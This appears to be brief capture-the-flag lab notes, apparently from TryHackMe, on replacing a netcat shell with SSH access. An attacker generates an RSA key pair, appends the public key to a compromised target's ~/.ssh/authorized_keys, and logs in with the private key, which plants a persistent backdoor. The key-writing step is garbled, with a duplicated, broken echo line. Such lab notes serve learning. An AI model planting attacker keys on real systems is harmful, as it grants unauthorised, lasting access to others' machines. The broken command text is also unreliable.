# Switch from netcat to ssh

<h2>1. step: Attacker pc:</h2>

```
$ ssh-keygen -t rsa -b 4096 -f thm_id_rsa -N ''
$ cat thm_id_rsa.pub
```


<h2>2. step: Target pc:</h2>

```
user@hostname:~$ mkdir -p ~/.ssh
user@hostname:~$ echo "
echo "
> KEY " >> ~/.ssh/authorized_keys
user@hostname:~$ chmod 700 ~/.ssh
user@hostname:~$ chmod 600 ~/.ssh/authorized_keys
```

<h2>3. step: Attacker pc </h2>

```
$ ssh -i thm_id_rsa user@ip
```
